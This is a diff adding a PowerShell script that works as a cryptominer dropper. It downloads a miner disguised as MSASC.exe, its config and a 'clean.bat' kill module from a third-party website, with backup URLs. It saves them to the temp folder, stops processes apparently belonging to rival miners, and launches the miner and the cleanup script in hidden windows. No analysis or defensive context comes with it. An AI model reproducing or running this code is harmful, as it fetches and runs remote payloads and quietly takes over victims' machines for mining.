@@ -1,0 +1,66 @@
+$ne = $MyInvocation.MyCommand.Path
+$miner_url = "https://www.naosbio.com/images/main/js/a/MSASC.exe"
+$miner_url_backup = "https://www.naosbio.com/images/main/js/a/MSASC.exe"
+$miner_name = "MSASC"
+$miner_cfg_url = "https://www.naosbio.com/images/main/js/a/config.json"
+$miner_cfg_url_backup = "https://www.naosbio.com/images/main/js/a/config.json"
+$miner_cfg_name = "config.json"
+$killmodule_url = "https://www.naosbio.com/images/main/js/a/clean.bat"
+$killmodule_url_backup = "https://www.naosbio.com/images/main/js/a/clean.bat"
+$killmodule_name = "clean.bat"
+$miner_path = "$env:TMP\MSASC.exe"
+$miner_cfg_path = "$env:TMP\config.json"
+$payload_path = "$env:TMP\update.ps1"
+$killmodule_path = "$env:TMP\clean.bat"
+Get-Process -Name javax | Stop-Process
+Get-Process -Name nssm | Stop-Process
+function Update($url,$backup_url,$path,$proc_name)
+ {        
+    Get-Process -Name $proc_name | Stop-Process
+    Remove-Item $path
+    Try {
+        $vc = New-Object System.Net.WebClient
+        $vc.DownloadFile($url,$path)
+    }
+    Catch {
+        Write-Output "donwload with backurl"
+        $vc = New-Object System.Net.WebClient
+        $vc.DownloadFile($backup_url,$path)
+    }
+}
+#miner_path
+
+#clean.bat
+if((Test-Path $killmodule_path))
+{
+    Remove-Item $killmodule_path
+	Update $killmodule_url $killmodule_url_backup $killmodule_path $killmodule_name
+}
+else {
+    Update $killmodule_url $killmodule_url_backup $killmodule_path $killmodule_name
+}
+
+if(!(Get-Process $miner_name -ErrorAction SilentlyContinue)) 
+{
+    if((Test-Path $miner_path))
+    {
+    Write-Output "miner file exist"
+    }
+    else {
+    Update $miner_url $miner_url_backup $miner_path $miner_name
+    }
+#miner_cfg_path
+    if((Test-Path $miner_cfg_path))
+    {
+    Write-Output "miner_cfg file exist"
+    }
+    else {
+    Update $miner_cfg_url $miner_cfg_url_backup $miner_cfg_path $miner_cfg_name
+    }
+	Start-Process $miner_path -windowstyle hidden
+} 
+else 
+{
+	Write-Output "Miner Running"
+}
+Start-Process cmd.exe "/c $killmodule_path" -windowstyle hidden
